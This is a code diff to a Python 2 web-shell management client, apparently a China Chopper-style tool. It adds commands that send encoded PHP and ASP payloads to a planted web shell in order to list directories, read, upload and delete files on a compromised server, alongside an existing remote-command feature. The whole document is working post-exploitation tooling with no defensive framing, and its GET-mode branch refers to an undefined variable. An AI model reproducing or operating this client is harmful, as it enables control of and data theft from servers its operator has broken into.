@@ -9,7 +9,6 @@ DbConn = None
 DbCur  = None
 Pwd = "."
 Password = ""
-Prompt = "$"
 System = "Linux"
 Shell_Url = ""
 Shell_Type = ""
@@ -134,9 +133,7 @@ def Shell_Info_PHP():
     print "Win_DriveInfo:%s\r\nSystemInfo:%s" % (driveInfo,SystemInfo)
     if SystemInfo.find("Windows") >= 0:
         global Shell_Bin
-        global Prompt
         System = "Windows"
-        Prompt = ">"
         Pwd = Pwd.replace("/","\\")
 
 def Shell_Info_ASP():
@@ -168,9 +165,7 @@ def Shell_Info_ASP():
     print "Win_DriveInfo:%s" % driveInfo
     global System
     global Shell_Bin
-    global Prompt
     System = "Windows"
-    Prompt = ">"
     Pwd = Pwd.replace("/","\\")
 
 def Shell_Info():
@@ -283,7 +278,7 @@ def Shell_Cmd_ASP(cmd):
 def Shell_Cmd(cmd):
     if Shell_Type == "PHP":
         return Shell_Cmd_PHP(cmd)
-    if Shell_Type == "ASP":
+    elif Shell_Type == "ASP":
         return Shell_Cmd_ASP(cmd)
     else:
         print "Faild type!"
@@ -322,6 +317,261 @@ def DirChange(path):
                 PromptInit()
                 return
 
+def Shell_List_ASP():
+    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
+    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail")
+    asp_list = Core.Config.GetConfig("SM","shellcode","asp_list")
+    asp_list = asp_list.replace("#shell_path#", Pwd.encode("hex"))
+    shellcode = Shell_Pass + "=" + asp_head
+    shellcode += asp_list.encode("hex") + asp_tail
+    
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    return retContent
+
+def Shell_List_PHP():
+    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
+    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
+    php_list = Core.Config.GetConfig("SM","shellcode","php_list")
+    php_list = php_list.replace("#shell_path#", base64.b64encode(Pwd))
+    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
+    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_list+php_tail))
+
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    retContent = retContent.replace("\\t","\t")
+    return retContent
+
+def Shell_List():
+    if Shell_Type == "PHP":
+        print Shell_List_PHP()
+    elif Shell_Type == "ASP":
+        print Shell_List_ASP()
+    else:
+        print "Faild type!"
+
+def Shell_Read_PHP(filename):
+    if System == "Windows":
+        if filename.find(":") < 0:
+            filename = Pwd + filename
+    else:
+        if filename[0:1] != "/":
+            filename = Pwd + "/" + filename
+
+    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
+    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
+    php_read = Core.Config.GetConfig("SM","shellcode","php_read")
+    php_read = php_read.replace("#shell_file#", base64.b64encode(filename))
+    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
+    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_read+php_tail))
+    
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    retContent = retContent.replace("\\t","\t")
+    return retContent
+
+def Shell_Read_ASP(filename):
+    if filename.find(":") < 0:
+        filename = Pwd + "\\" + filename
+    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
+    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail") 
+    asp_read = Core.Config.GetConfig("SM","shellcode","asp_read")
+    asp_read = asp_read.replace("#shell_file#", filename.encode("hex"))
+    shellcode = Shell_Pass + "=" + asp_head
+    shellcode += asp_read.encode("hex") + asp_tail
+
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    retContent = retContent.replace("\\t","\t")
+    return retContent
+
+def Shell_Read(filename):
+    if Shell_Type == "PHP":
+        print Shell_Read_PHP(filename)
+    elif Shell_Type == "ASP":
+        print Shell_Read_ASP(filename)
+    else:
+        print "Faild type!"
+
+def Shell_Up_PHP(filename,localfile):
+    if System == "Windows":
+        if filename.find(":") < 0:
+            filename = Pwd + filename
+    else:
+        if filename[0:1] != "/":
+            filename = Pwd + "/" + filename
+
+    php_head = Core.Config.GetConfig("SM","shellcode","php_head") 
+    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
+    php_up   = Core.Config.GetConfig("SM","shellcode","php_up")
+    php_up   = php_up.replace("#shell_file#", base64.b64encode(filename))
+
+    f = open(localfile,"rb")
+    fdata = f.readlines()
+    hexdata = ""
+    for l in fdata:
+        hexdata += l.encode("hex")
+
+    fdata = None
+    f.close()
+
+    php_up = php_up.replace("#shell_data#", hexdata)
+    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
+    shellcode += "&x0=" + urllib.quote(base64.b64encode(php_up+php_tail))
+    
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    retContent = retContent.replace("\\t","\t")
+    hexdata = ""
+    return retContent
+    
+
+def Shell_Up_ASP(filename, localfile):
+    if filename.find(":") < 0:
+        filename = Pwd + "\\" + filename
+    asp_head = Core.Config.GetConfig("SM","shellcode","asp_head")
+    asp_tail = Core.Config.GetConfig("SM","shellcode","asp_tail") 
+    asp_up = Core.Config.GetConfig("SM","shellcode","asp_up")
+    f = open(localfile,"rb")
+    fdata = f.readlines()
+    hexdata = ""
+    for l in fdata:
+        hexdata += l.encode("hex")
+
+    fdata = None
+    f.close()
+
+    asp_up = asp_up.replace("#shell_file#", filename.encode("hex"))
+    asp_up = asp_up.replace("#shell_data#", hexdata)
+    shellcode = Shell_Pass + "=" + asp_head
+    shellcode += asp_up.encode("hex") + asp_tail
+    
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    retContent = retContent.replace("\\t","\t")
+    hexdata = ""
+    return retContent
+
+def Shell_Up(filename, localfile):
+    if Shell_Type == "PHP":
+        ret = Shell_Up_PHP(filename,localfile)
+    elif Shell_Type == "ASP":
+        ret = Shell_Up_ASP(filename,localfile)
+    else:
+        print "Faild type!"
+        print Shell_Type
+        return
+
+    if ret == "1":
+        print "Upload successfully!"
+    else:
+        print "Upload faild!"
+
+def Shell_Del(filename):
+    php_head = Core.Config.GetConfig("SM","shellcode","php_head")
+    php_tail = Core.Config.GetConfig("SM","shellcode","php_tail")
+    shellcode = Shell_Pass + "=" + urllib.quote(php_head)
+
+    php_del = Core.Config.GetConfig("SM","shellcode","php_del")
+    php_del = php_del.replace("#shell_file#", base64.b64encode(filename))
+    shellcode += "&x0=" +  urllib.quote(base64.b64encode(php_del+php_tail))
+
+    sendData = shellcode
+    #print sendData
+    if Shell_Method == "GET":
+            url = url + "?" + sendData
+
+    httpClient = Core.Http.HttpClient(Shell_Url)
+    httpClient.Method = Shell_Method
+    httpClient.PostData = sendData
+    try:
+        retContent =  httpClient.GetString()
+    except Exception,e:
+        print e
+        return
+
+    retContent = retContent[retContent.find("->|")+3:retContent.find("|<-")]
+    retContent = retContent.replace("\\t","\t")
+    print retContent
+    return retContent
 
 def OtherCommand(command):
     global Pwd
@@ -355,9 +605,11 @@ def UseShell(argv):
             MainCommandList = Core.Command.CommandList
             Core.Command.CommandList = []
             Core.Command.CommandAdd("scdir", DirChange, "Change the current directory\r\n   Use:cdir [..|PATH]")
-            Core.Command.CommandAdd("slist", DirChange, "List directory contents")
-            Core.Command.CommandAdd("sget", DirChange, "Get the file")
-            Core.Command.CommandAdd("sup", DirChange, "Upload the file")
+            Core.Command.CommandAdd("slist", Shell_List, "List directory contents")
+            Core.Command.CommandAdd("sread", Shell_Read, "Read the file\r\n   Use:sread filename")
+            Core.Command.CommandAdd("sdel", Shell_Del, "Delete the file.")
+            #Core.Command.CommandAdd("sget", Shell_get, "Get the file")
+            Core.Command.CommandAdd("sup", Shell_Up, "Upload the file\r\n   Use:sup filename localfile")
             Core.Command.CommandAdd("exit", Shell_Cmd_Exit, "Exit this shell")
             Core.Command.CommandAdd("help", Core.Command.CommandShow, "Show the command list")
             Core.Command.CommandAdd("other", OtherCommand, "Remote Command")
